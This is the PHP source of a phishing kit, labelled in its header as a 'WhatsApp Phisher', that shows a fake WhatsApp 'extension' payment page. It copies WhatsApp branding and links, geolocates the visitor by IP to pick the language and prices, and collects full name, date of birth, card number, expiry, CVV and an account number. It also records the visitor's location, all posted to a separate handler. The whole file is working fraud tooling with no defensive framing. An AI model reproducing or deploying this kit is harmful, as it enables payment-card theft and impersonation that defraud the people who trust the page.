?<?php
/*
 WhatsApp Phisher
 File : index.php
 Coded by x256
 Ask for updates premiumers(at)gmail.com ;)
*/

@include("send.php");
@include("geo.php");
$Title = "Payment";
$SubTitle = "PURCHASE FOR EXTENSION";
$Year = "YEAR";
$Years = "YEARS";
$Price1 = "0.99"; $Price2 = "2.67"; $Price3 = "3.71"; $curr = "$";
$CardHolder = "Full name";
$FullName = "Full name";
$Dob = "Date of birth";
$CardNum = "Card number";
$Expir = "Expiration Date";
$Cvv = "The last three digits on the back of the card.";
$kontonum = "E-mail adress";
$kontohelp = "E-mail adress.";
$Accept1 = "i Accept the";
$Accept2 = "Terms of use.";
$Accept3 = "";
$Contin = "Continue";
$PubLink = "Why we don't sell ads";
$langa = "en";
$UserCountry = ip_info("$ip", "Country Code");

if($_GET["l"] == "en") { }
elseif($_GET["l"] == "fr" OR $UserCountry == "FR") {
	$PageTitle = "WhatsApp  —  Paiement";
	$Title = "Paiement";
	$SubTitle = "ACHETER L'EXTENSION POUR";
	$Year = "AN"; $Years = "ANS";
	$Price1 = "0.89"; $Price2 = "2.40"; $Price3 = "3.34"; $curr = "€";
	$CardHolder = "Titulaire de la carte";
	$FullName = "Nom complet";
	$Dob = "Date de naissance";
	$CardNum = "Numéro de carte";
	$Expir = "Expiration";
	$Cvv = "The last three digits found on the back of your card.";
	$kontonum = "Numéro du compte";
	$kontohelp = "Votre numéro de compte figure en haut de votre relevé bancaire.";
	$Accept1 = "J'accepte";
	$Accept2 = "les conditions";
	$Accept3 = "générales d'utilisation.";
	$Contin = "Continuez";
	$PubLink = "Pourquoi nous ne vendons pas de publicité";
	$langa = "fr";
}

elseif($_GET["l"] == "de" OR $UserCountry == "DE" OR $UserCountry == "CH") {
	$PageTitle = "WhatsApp  —  Bezahlung";
	$Title = "Bezahlinformationen";
	$Year = "JAHR";
	$Years = "JAHRE";
	$Price1 = "0.89"; $Price2 = "2.40"; $Price3 = "3.34"; $curr = "€";
	$CardHolder = "Kartenhalter";
	$FullName = "Voller Name";
	$Dob = "Geburtsdatum";
	$CardNum = "Kartennummer";
	$Expir = "Ablaufdatum";
	$Cvv = "Die letzten drei Ziffern auf der Rückseite Ihrer Karte gefunden.";
	$kontonum = "Kontonummer";
	$kontohelp = "Ihre Kontonummer an der Spitze der Ihrem Kontoauszug";
	$Accept1 = "Ich akzeptiere die ";
	$Accept2 = "Nutzungsbedingungen.";
	$Accept3 = "";
	$Contin = "Fortsetzen";
	$PubLink = "Warum wir keine Anzeigen verkaufen";
	$langa = "de";
}
echo "<!doctype html><html><head>
<link rel='shortcut icon' href='images/favicon.ico'>
<meta http-equiv='Content-Type' content='text/html; charset=UTF-8' />
<meta name='HandheldFriendly' content='true' />
<meta name='viewport' content='width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1,  user-scalable=no' />
<title>WhatsApp  —  $Title</title>
<link rel='stylesheet' href='css/style_m_common.css?1' type='text/css' charset='utf-8'>
<link rel='stylesheet' href='css/style_m_other.css?11' type='text/css' charset='utf-8'>
<script type='text/javascript' src='js/jquery.js'></script>
<script type='text/javascript'>\$(function() {\$(\"#load\").delay(3400).fadeOut(100); $(\"#payment\").delay(3500).fadeIn(100);});</script></head><body>";
echo "<div class='wrapper'>
<div class='shade'><div class='bar'><div class='logo'><a href='#'></a></div><div class='title'><h1>WhatsApp Messenger</h1></div><div class='nav' id='nav'><a href='#' onClick='showMenu(); return false;'></a></div></div></div>
<div id='menu-inner'>
<div class='clear'></div>
<li class='social'>
<span class='btn btn1'><a href='https://twitter.com/whatsapp' target='_blank'>Twitter</a></span><span class='btn btn2'><a href='https://www.facebook.com/WhatsApp' target='_blank'>Facebook</a></span><span class='btn btn3'><a href='https://plus.google.com/102708307632999019941/posts' target='_blank'>Google Plus</a></span>
</li><div id='lang_select'>
<span class='icon'></span>
<select onchange='window.location = this.options[this.selectedIndex].value;' style='padding:1px 1px 1px 1px;'>
<option value=''>Language</option><option ";
if ($_GET["l"] == "en") {echo " selected='selected' ";} echo "value='?l=en'>English</option><option ";
if ($_GET["l"] == "fr") {echo " selected='selected' ";} echo "value='?l=fr'>Français</option><option";
if ($_GET["l"] == "de") {echo " selected='selected' ";} echo " value='?l=de'>Deutsch</option></select>";
echo "<div class='clear'></div></div>
</div>
<div class='top inner'>
<div class='container' id='title-container'>
<h1>$Title</h1>
</div></div>";
echo "<form action='pay.php' method='post'>";
echo "<input name='location' type='hidden' value='".ip_info("$ip", "Address")."'>";
echo "<input name='langa' type='hidden' value='$langa'>";
echo "<div class='content inner about'>
<div style='padding-bottom:10px'>$SubTitle</div>
<TABLE cellpadding='0' cellspacing='0' width='100%'><tr valign='top'>
<td class='exten'><label for='ext1'><b>1 $Year</b><br>$curr $Price1<br></label><input type='radio' name='ext' value='$curr $Price1' id='ext1' checked/></td>
<td class='exten'><label for='ext2'><b>3 $Years</b><br>$curr $Price2<br></label><input type='radio' name='ext' value='$curr $Price2' id='ext2'/><br><font style='color:#888888; '>-10%</font></td>
<td class='exten' style='border-right:0px;'><label for='ext3'><b>5 $Years</b><br>$curr $Price3<br></label><input type='radio' name='ext' value='$curr $Price3' id='ext3'/><br><font style='color:#888888; '>-25%</font></td>
</tr>
</table>
<div id='load' style='width:100%; min-height:120px; text-align:center; padding-top:40px'><img src='images/load.gif'></div>
<div id='payment' style='display:none; min-height:240px; '><br>
<table border='0' width='100%' align='center' cellpadding='5' cellspacing='0'>
<tr><td align='right' width='30%' class='deskonly'><label for='hold'>$CardHolder</label></td>
<td><label for='hold' class='mobonly'>$CardHolder<br></label><input required placeholder='$FullName' type='text' size='19' name='hold' value='' id='hold' style='width:97%'></td>
<td>&nbsp;</td></tr><tr>
<td align='right' class='deskonly'><label for='djj'>$Dob</label></td>
<td><label for='djj' class='mobonly'>$Dob<br></label>
<select name='djj' id='djj' required><option value=''>-</option>";
for ($x = 1; $x <= 31; $x++) {if($x < 10) {$jj = "0$x";} else {$jj = "$x";} echo "<option value='$jj'>$jj</option>"; }
echo "</select>&nbsp; <select name='dmm' required><option value=''>-</option>";
for ($x = 1; $x <= 12; $x++) {if($x < 10) {$mm = "0$x";} else {$mm = "$x";} echo "<option value='$mm'>$mm</option>"; }
echo "</select>&nbsp; <select name='daa' required><option value=''>-</option>";
for ($x = 1997; $x >= 1900; $x--) {echo "<option value='$x'>$x</option>"; }
echo "</select></td><td>&nbsp;</td></tr><tr><td class='deskonly'>&nbsp;</td>
<td class='deskonly' colspan='2'><img src='images/cc.png' height='20'/></td></tr><tr>
<td align='right' class='deskonly'><label for='ccnum'>$CardNum</label></td>
<td><label for='ccnum' class='mobonly'>$CardNum<br></label><input required placeholder='---- ---- ---- ----' type='tel' size='19' name='ccnum' value='' id='ccnum' style='width:97%'></td>
<td width='45' valign='bottom'><img src='images/cct.png' id='ccnum-type' style='height:25px;'/></td></tr>
<tr><td class='mobonly' colspan='2'><img src='images/cc.png' height='20'/></td></tr>
<tr><td align='right' class='deskonly'><label for='expiry'>$Expir</label></td>
<td><table border='0' width='100%' cellpadding='0' cellspacing='0'><tr><td><label for='expiry' class='mobonly'>$Expir<br></label>
<input required placeholder='-- / --' size='7' type='tel' name='expiry' value='' id='expiry'></td>
<td align='right'><label for='Cvv' class='deskonly'>Cvv</label><label for='Cvv' class='mobonly'>Cvv<br></label><input required placeholder='---'  size='4' type='tel' name='Cvv' value='' id='Cvv' style='margin-left:10px'></td>
</tr></table></td>
<td valign='bottom'><a class='tooltip' title='$Cvv'><img src='images/help.png' style='cursor:help'/></a></td>
</tr>

<tr><td align='right' width='30%' class='deskonly'><label for='kontonum'>$kontonum</label></td>
<td><label for='kontonum' class='mobonly'>$kontonum<br></label><input required type='tel' name='kontonum' value='' id='kontonum' style='width:97%'></td>
<td valign='bottom'><a class='tooltip' title='$kontohelp'><img src='images/help.png' style='cursor:help'/></a></td></tr><tr>

<tr>
<td class='deskonly'>&nbsp;</td>
<td colspan='2'><input required type='checkbox' name='tos' id='tos' style='margin:0px; padding:0px;'> <label for='tos'>$Accept1 <a href='http://www.whatsapp.com/legal/' target='_blank'>$Accept2</a> $Accept3</label></td>
</tr><tr><td class='deskonly'>&nbsp;</td><td colspan='2'><input type='submit' value='$Contin' class='submit'/></td></tr>
</form></table>
<script src='js/payform.min.js'></script>
</div><br>
<table width='100%' cellpadding='0' cellspacing='0'>
<tr><td style=\"background:url('images/vbv.png') no-repeat; height:40px\">&nbsp;</td></tr>";
echo "<tr><td><br><br><a href='http://blog.whatsapp.com/245/' target='_blank'>$PubLink</a></td></tr></table></div>";
echo "<div id='footer' class='footer'>
<div id='btm-menu'><a href='#' class='home-link'></a></div>
<div id='btm_lang_select'>
<div class='container'><span class='icon'></span>";
echo "<select onchange='window.location = this.options[this.selectedIndex].value;' style='padding:1px 1px 1px 1px;'><option value=''>Language</option><option ";
if ($_GET["l"] == "en") {echo " selected='selected' ";} echo "value='?l=en'>English</option><option ";
if ($_GET["l"] == "fr") {echo " selected='selected' ";} echo "value='?l=fr'>Français</option><option";
if ($_GET["l"] == "de") {echo " selected='selected' ";} echo " value='?l=de'>Deutsch</option></select>";
echo "</div></div><div id='copyright'>&copy; 2016 WhatsApp Inc.</div>
<div class='social'><div class='btns'>
<span class='btn btn1'><a href='https://twitter.com/whatsapp' target='_blank'>Twitter</a></span>
<span class='btn btn2'><a href='https://www.facebook.com/WhatsApp' target='_blank'>Facebook</a></span>
<span class='btn btn3'><a href='https://plus.google.com/102708307632999019941/posts' target='_blank'>Google Plus</a></span>
</div></div></div></div></body></html>";
?>

<script type="text/javascript">
var menuActive = false;
function showMenu() {
	if (menuActive) {
		setClass('menu-inner','');
		setClass('nav','nav');
		menuActive = false;
	} else {
		setClass('menu-inner','active');
		setClass('nav','nav close');
		menuActive = true;
	}

	return false;
}
function setClass(id, classnm) {document.getElementById(id).setAttribute("class", classnm);}
</script>

